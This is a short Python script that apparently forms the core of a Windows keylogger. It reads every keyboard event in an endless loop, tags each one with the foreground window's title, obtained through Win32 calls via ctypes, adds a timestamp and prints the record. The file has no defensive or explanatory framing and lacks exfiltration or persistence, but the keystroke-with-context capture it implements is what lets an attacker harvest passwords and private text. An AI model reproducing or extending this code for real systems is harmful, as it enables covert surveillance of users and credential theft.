import modules.keyboard as kbd
import datetime
from ctypes import windll, create_unicode_buffer

def window():
    """Enter StackOverflow code
    
    Interacts directly with Win32 API using CTypes"""
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
    
    return str(buf.value) if buf.value else ""

while True:
    timestamp = str(datetime.datetime.now())
    event = kbd.read_event()
    final = {
        "event": event,
        "window": window(),
        "time": timestamp
    }
    print(final)